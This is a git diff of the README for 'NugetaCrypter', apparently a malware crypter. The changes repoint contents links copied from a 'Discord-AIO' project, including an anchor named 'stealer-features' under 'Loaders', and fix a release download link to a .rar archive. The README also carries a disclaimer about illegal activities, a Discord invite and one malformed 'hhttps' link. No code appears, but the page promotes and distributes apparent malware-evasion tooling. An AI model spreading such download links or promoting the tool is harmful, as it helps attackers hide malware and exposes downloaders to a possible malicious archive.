@@ -13,12 +13,12 @@ I will not be held accountable for any illegal activities.
   
 ## Contents Page
 [Discord](https://discord.gg/gb5EXcB2GX)<br/>
-[Main features](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#main-features)<br/>
-[Loaders ](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#stealer-features)<br/>
-[FAQ](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#faq)<br/>
-[Showcase](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#showcase)<br/>
+[Main features](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#main-features)<br/>
+[Loaders ](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#stealer-features)<br/>
+[FAQ](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#faq)<br/>
+[Showcase](hhttps://github.com/Nugeta/NugetaCrypter/blob/main/README.md#showcase)<br/>
   
-<a href="https://github.com/Nugeta/NugetaCrypter/releases/download/Nugeta.rar">
+<a href="https://github.com/Nugeta/NugetaCrypter/releases/download/Release/Nugeta.rar">
   <img src="https://media.discordapp.net/attachments/1086341505452617751/1096472508993110046/Screenshot_2023-04-10_003705.png" width="400" height="160" />
 </a>
 
@@ -74,7 +74,7 @@ Yes, the program is 100% free and open source.
 On our [Discord](https://discord.gg/gb5EXcB2GX).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nugeta/NugetaCrypter/releases/download/Nugeta.rar) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nugeta/NugetaCrypter/releases/download/Release/Nugeta.rar) or discord above.
 
 <div align="center">
 
